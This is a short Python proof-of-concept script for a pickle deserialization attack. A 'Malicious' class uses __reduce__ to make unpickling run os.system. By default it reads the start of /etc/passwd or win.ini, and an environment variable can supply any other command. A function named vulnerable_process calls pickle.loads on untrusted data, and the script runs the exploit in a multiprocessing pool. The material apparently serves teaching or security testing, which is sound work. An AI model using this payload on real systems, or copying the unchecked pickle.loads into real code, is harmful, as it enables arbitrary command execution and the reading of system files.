import multiprocessing
import pickle
import os
import sys
import logging

logging.basicConfig(level=logging.INFO)

def get_command():
    # Allow an override via environment variable
    override = os.environ.get("MALICIOUS_CMD")
    if override:
        logging.info("Using override command from environment.")
        return override
    # Choose based on operating system and file existence
    if sys.platform.startswith('win'):
        if os.path.exists("C:\\Windows\\win.ini"):
            return 'powershell -Command "Get-Content C:\\Windows\\win.ini -TotalCount 30"'
        else:
            return 'echo "Default Windows command"'
    else:
        if os.path.exists("/etc/passwd"):
            return 'head -n 30 /etc/passwd'
        else:
            return 'echo "Default Unix command"'

class Malicious:
    def __reduce__(self):
        cmd = get_command()
        return (os.system, (cmd,))

def vulnerable_process(data):
    if data:
        return pickle.loads(data)
    else:
        logging.error("No data provided!")
        return None

if __name__ == '__main__':
    malicious_pickle = pickle.dumps(Malicious())
    with multiprocessing.Pool(processes=1) as pool:
        pool.apply(vulnerable_process, (malicious_pickle,))
    logging.info("Vulnerable code executed!")
